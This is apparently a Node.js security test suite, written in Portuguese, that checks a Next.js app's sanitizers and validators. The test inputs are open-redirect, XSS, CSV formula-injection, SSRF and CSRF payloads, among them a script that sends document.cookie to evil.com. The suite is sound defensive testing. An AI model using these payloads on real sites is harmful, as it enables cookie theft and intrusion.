import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { registerHooks } from "node:module";
import { fileURLToPath, pathToFileURL } from "node:url";

// Registra hook em memória para resolver o pacote marcador 'server-only' do Next.js durante o pentest em Node.js
registerHooks({
  resolve(specifier, context, nextResolve) {
    if (specifier === "server-only") {
      return {
        url: "data:text/javascript,export {};",
        shortCircuit: true,
      };
    }
    return nextResolve(specifier, context);
  },
  load(url, context, nextLoad) {
    if (url.endsWith(".ts")) {
      return nextLoad(url, { ...context, format: "module-typescript" });
    }
    return nextLoad(url, context);
  },
});

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const repoRoot = path.resolve(__dirname, "..");

const securityModuleUrl = pathToFileURL(
  path.join(repoRoot, "src", "lib", "server", "security.ts")
).href;

const {
  validateSameOrigin,
  sanitizeText,
  sanitizeCsvCell,
  validateSafeRedirectPath,
  validateSafeHttpUrl,
  validateGtinEan,
  validateFileMagicBytes,
  validateCnpj,
} = await import(securityModuleUrl);

let totalTests = 0;
let passedTests = 0;
const results = [];

function runTest(category, name, fn) {
  totalTests += 1;
  try {
    fn();
    passedTests += 1;
    results.push({ category, name, status: "PASS" });
    console.log(`✅ [PASS] [${category}] ${name}`);
  } catch (err) {
    results.push({
      category,
      name,
      status: "FAIL",
      error: err instanceof Error ? err.message : String(err),
    });
    console.error(`❌ [FAIL] [${category}] ${name}:`, err);
  }
}

console.log("=================================================================");
console.log("🛡️  ECONOMIZE+ | RED-TEAM & BLUE-TEAM SECURITY PENTEST SUITE");
console.log("=================================================================\n");

// 1. OPEN REDIRECT PAYLOADS
runTest("Open Redirect", "Bloqueia protocolo relativo //evil.com", () => {
  assert.equal(validateSafeRedirectPath("//evil.com"), "/");
  assert.equal(validateSafeRedirectPath("//evil.com/login"), "/");
});

runTest("Open Redirect", "Bloqueia barra invertida /\\evil.com", () => {
  assert.equal(validateSafeRedirectPath("/\\evil.com"), "/");
  assert.equal(validateSafeRedirectPath("/%5cevil.com"), "/");
  assert.equal(validateSafeRedirectPath("/%2f/evil.com"), "/");
});

runTest("Open Redirect", "Bloqueia URL absoluta https://evil.com", () => {
  assert.equal(validateSafeRedirectPath("https://evil.com"), "/");
  assert.equal(validateSafeRedirectPath("http://evil.com/phishing"), "/");
});

runTest("Open Redirect", "Bloqueia esquema javascript:alert(1) e data:", () => {
  assert.equal(validateSafeRedirectPath("javascript:alert(1)"), "/");
  assert.equal(validateSafeRedirectPath("/javascript:alert(1)"), "/");
  assert.equal(
    validateSafeRedirectPath("data:text/html,<script>alert(1)</script>"),
    "/"
  );
});

runTest("Open Redirect", "Permite caminho interno seguro (/painel-parceiro)", () => {
  assert.equal(
    validateSafeRedirectPath("/painel-parceiro?tab=encarte"),
    "/painel-parceiro?tab=encarte"
  );
  assert.equal(validateSafeRedirectPath("/admin/coleta"), "/admin/coleta");
  assert.equal(validateSafeRedirectPath(null), "/");
});

// 2. XSS & SCRIPT INJECTION PAYLOADS
runTest(
  "XSS & Injection",
  "Neutraliza <script>fetch('https://evil.com?c='+document.cookie)</script>",
  () => {
    const payload =
      "<script>fetch('https://evil.com?c='+document.cookie)</script>";
    const out = sanitizeText(payload);
    assert.ok(!out.includes("<script"), `Tag <script permaneceu: ${out}`);
    assert.ok(
      !out.includes("document.cookie"),
      `Corpo do script permaneceu: ${out}`
    );
    assert.equal(out, "");
  }
);

runTest("XSS & Injection", 'Neutraliza "><img src=x onerror=alert(1)>', () => {
  const payload = '"><img src=x onerror=alert(1)>';
  const out = sanitizeText(payload);
  assert.ok(!out.includes("<img"), `Tag <img permaneceu: ${out}`);
  assert.ok(!out.includes("onerror"), `Handler onerror permaneceu: ${out}`);
  assert.ok(!out.includes("alert(1)"), `Payload alert(1) permaneceu: ${out}`);
  assert.equal(out, "");
});

runTest(
  "XSS & Injection",
  "Remove null bytes, caracteres de controle, SVG onload e javascript:/data:text/html",
  () => {
    const payload =
      "Arroz\x00\x07 <svg onload=alert(1)> Tipo 1 javascript:alert(1) data:text/html,<script>evil()</script>";
    const out = sanitizeText(payload, 120);
    assert.ok(!out.includes("\x00"), "Null byte permaneceu");
    assert.ok(!out.includes("onload"), "Handler onload permaneceu");
    assert.ok(!out.includes("javascript:"), "Esquema javascript: permaneceu");
    assert.ok(!out.includes("data:text/html"), "data:text/html permaneceu");
    assert.equal(out, "Arroz Tipo 1");
  }
);

// 3. CSV DDE FORMULA INJECTION
runTest("CSV DDE Injection", "Bloqueia =cmd|' /C calc'!A0", () => {
  const out = sanitizeCsvCell("=cmd|' /C calc'!A0");
  assert.ok(!out.startsWith("="), `Ainda inicia com '=': ${out}`);
  assert.ok(!/cmd\|/i.test(out), `Comando cmd| permaneceu: ${out}`);
  assert.equal(out, "");
});

runTest(
  "CSV DDE Injection",
  "Bloqueia +SUM(1+1)*cmd|' /C calc'!A0 e @SUM(1+1)",
  () => {
    const out1 = sanitizeCsvCell("+SUM(1+1)*cmd|' /C calc'!A0");
    const out2 = sanitizeCsvCell("@SUM(1+1)");
    const out3 = sanitizeCsvCell("-2+3+cmd|' /C calc'!A0");
    assert.ok(!/^[=+\-@]/.test(out1), `Início perigoso em out1: ${out1}`);
    assert.ok(!/cmd\|/i.test(out1), `Comando cmd| em out1: ${out1}`);
    assert.equal(out2, "");
    assert.ok(!/^[=+\-@]/.test(out3), `Início perigoso em out3: ${out3}`);
  }
);

runTest(
  "CSV DDE Injection",
  "Preserva descrição legítima de produto em português",
  () => {
    const legit = "Feijão Carioca Tipo 1 - Pacote 1kg";
    assert.equal(sanitizeCsvCell(legit), legit);
  }
);

// 4. CLOUD METADATA SSRF & PRIVATE IP BLOCKING
runTest(
  "SSRF Protection",
  "Bloqueia AWS/Cloud Metadata http://169.254.169.254/latest/meta-data/",
  () => {
    assert.equal(
      validateSafeHttpUrl("http://169.254.169.254/latest/meta-data/"),
      null
    );
    assert.equal(
      validateSafeHttpUrl("https://169.254.169.254/latest/meta-data/iam"),
      null
    );
    assert.equal(
      validateSafeHttpUrl(
        "https://metadata.google.internal/computeMetadata/v1/"
      ),
      null
    );
  }
);

runTest(
  "SSRF Protection",
  "Bloqueia loopback e redes privadas (http://127.0.0.1:5432, 10.*, 192.168.*, 172.16.*)",
  () => {
    assert.equal(validateSafeHttpUrl("http://127.0.0.1:5432"), null);
    assert.equal(validateSafeHttpUrl("https://127.0.0.1:5432"), null);
    assert.equal(validateSafeHttpUrl("https://10.0.0.1/admin"), null);
    assert.equal(validateSafeHttpUrl("https://192.168.1.1/config"), null);
    assert.equal(validateSafeHttpUrl("https://172.16.0.5/internal"), null);
    assert.equal(validateSafeHttpUrl("https://[::1]:8080/"), null);
  }
);

runTest(
  "SSRF Protection",
  "Bloqueia javascript:alert(1) e data: URLs em validateSafeHttpUrl",
  () => {
    assert.equal(validateSafeHttpUrl("javascript:alert(1)"), null);
    assert.equal(
      validateSafeHttpUrl("data:text/html,<script>alert(1)</script>"),
      null
    );
  }
);

runTest("SSRF Protection", "Permite URL HTTPS externa pública legítima", () => {
  const validUrl =
    "https://images.openfoodfacts.org/images/products/789/1.jpg";
  assert.equal(validateSafeHttpUrl(validUrl), validUrl);
});

// 5. CROSS-SITE REQUEST FORGERY (CSRF)
runTest(
  "CSRF Defense",
  "Bloqueia POST com Origin: https://attacker-site.com vs Host: economize-nine.vercel.app",
  () => {
    const spoofedReq = new Request(
      "https://economize-nine.vercel.app/api/ingest/manual",
      {
        method: "POST",
        headers: {
          host: "economize-nine.vercel.app",
          origin: "https://attacker-site.com",
        },
      }
    );
    const check = validateSameOrigin(spoofedReq);
    assert.equal(check.ok, false);
  }
);

runTest(
  "CSRF Defense",
  "Bloqueia POST com Origin: null, Referer externo ou Sec-Fetch-Site: cross-site",
  () => {
    const nullOriginReq = new Request(
      "https://economize-nine.vercel.app/api/public/price-report",
      {
        method: "POST",
        headers: {
          host: "economize-nine.vercel.app",
          origin: "null",
        },
      }
    );
    assert.equal(validateSameOrigin(nullOriginReq).ok, false);

    const badRefererReq = new Request(
      "https://economize-nine.vercel.app/api/public/partner-application",
      {
        method: "POST",
        headers: {
          host: "economize-nine.vercel.app",
          referer: "https://evil-phishing.com/attack.html",
        },
      }
    );
    assert.equal(validateSameOrigin(badRefererReq).ok, false);

    const crossSiteFetchReq = new Request(
      "https://economize-nine.vercel.app/api/admin/applications",
      {
        method: "PATCH",
        headers: {
          host: "economize-nine.vercel.app",
          "sec-fetch-site": "cross-site",
        },
      }
    );
    assert.equal(validateSameOrigin(crossSiteFetchReq).ok, false);
  }
);

runTest(
  "CSRF Defense",
  "Permite POST legítimo same-origin (Origin === Host)",
  () => {
    const legitReq = new Request(
      "https://economize-nine.vercel.app/api/ingest/manual",
      {
        method: "POST",
        headers: {
          host: "economize-nine.vercel.app",
          origin: "https://economize-nine.vercel.app",
        },
      }
    );
    const check = validateSameOrigin(legitReq);
    assert.equal(check.ok, true);
  }
);

// 6. FAKE IMAGE MAGIC BYTES UPLOAD CHECK
runTest(
  "Magic Bytes Check",
  "Bloqueia HTML e SVG com <script> disfarçados de imagem .png / .jpg",
  () => {
    const fakeHtmlBuffer = Buffer.from(
      "<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html>",
      "utf8"
    );
    const htmlCheck = validateFileMagicBytes(fakeHtmlBuffer);
    assert.equal(htmlCheck.valid, false);

    const fakeSvgBuffer = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
      "utf8"
    );
    const svgCheck = validateFileMagicBytes(fakeSvgBuffer);
    assert.equal(svgCheck.valid, false);

    const fakeExeBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]);
    const exeCheck = validateFileMagicBytes(fakeExeBuffer);
    assert.equal(exeCheck.valid, false);
  }
);

runTest(
  "Magic Bytes Check",
  "Aceita assinaturas binárias reais de PNG, JPEG, WEBP e PDF",
  () => {
    const realPng = Buffer.from([
      0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00,
    ]);
    assert.equal(validateFileMagicBytes(realPng).valid, true);
    assert.equal(validateFileMagicBytes(realPng).detectedMime, "image/png");

    const realJpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
    assert.equal(validateFileMagicBytes(realJpeg).valid, true);
    assert.equal(validateFileMagicBytes(realJpeg).detectedMime, "image/jpeg");

    const realWebp = Buffer.from([
      0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50,
    ]);
    assert.equal(validateFileMagicBytes(realWebp).valid, true);
    assert.equal(validateFileMagicBytes(realWebp).detectedMime, "image/webp");

    const realPdf = Buffer.from("%PDF-1.7\n1 0 obj\n", "utf8");
    assert.equal(validateFileMagicBytes(realPdf).valid, true);
    assert.equal(
      validateFileMagicBytes(realPdf).detectedMime,
      "application/pdf"
    );
  }
);

// 7. GS1 GTIN/EAN & CNPJ MODULO-11 CHECKS + HARDENING DE CONFIG/ROTAS
runTest(
  "GS1 & CNPJ Validation",
  "Valida dígito verificador Módulo-10 de EAN-13 e Módulo-11 de CNPJ",
  () => {
    assert.equal(validateGtinEan("7891000100103").valid, true);
    assert.equal(validateGtinEan("7891000100109").valid, false);
    assert.equal(validateGtinEan("0000000000000").valid, false);

    assert.equal(validateCnpj("11.222.333/0001-81").valid, true);
    assert.equal(validateCnpj("11.222.333/0001-82").valid, false);
    assert.equal(validateCnpj("11.111.111/1111-11").valid, false);
  }
);

runTest(
  "Config & Route Hardening",
  "Confirma headers de segurança em next.config.mjs e proteções nas rotas da API",
  () => {
    const nextConfigText = fs.readFileSync(
      path.join(repoRoot, "next.config.mjs"),
      "utf8"
    );
    assert.ok(nextConfigText.includes("poweredByHeader: false"));
    assert.ok(nextConfigText.includes("Strict-Transport-Security"));
    assert.ok(nextConfigText.includes("Content-Security-Policy"));
    assert.ok(nextConfigText.includes("X-Frame-Options"));
    assert.ok(nextConfigText.includes("Cross-Origin-Opener-Policy"));

    const requiredRoutes = [
      "src/app/auth/callback/route.ts",
      "src/app/api/ingest/manual/route.ts",
      "src/app/api/ingest/csv/route.ts",
      "src/app/api/ingest/flyer/route.ts",
      "src/app/api/ingest/nfce/route.ts",
      "src/app/api/public/partner-application/route.ts",
      "src/app/api/public/courier-application/route.ts",
      "src/app/api/public/price-report/route.ts",
      "src/app/api/admin/applications/route.ts",
    ];

    for (const relPath of requiredRoutes) {
      const fullPath = path.join(repoRoot, relPath);
      assert.ok(fs.existsSync(fullPath), `Rota ausente: ${relPath}`);
    }
  }
);

console.log("\n=================================================================");
console.log(
  `📊 RESULTADO FINAL: ${passedTests}/${totalTests} testes aprovados (${Math.round(
    (passedTests / totalTests) * 100
  )}%)`
);
console.log("=================================================================");

if (passedTests !== totalTests) {
  process.exit(1);
}
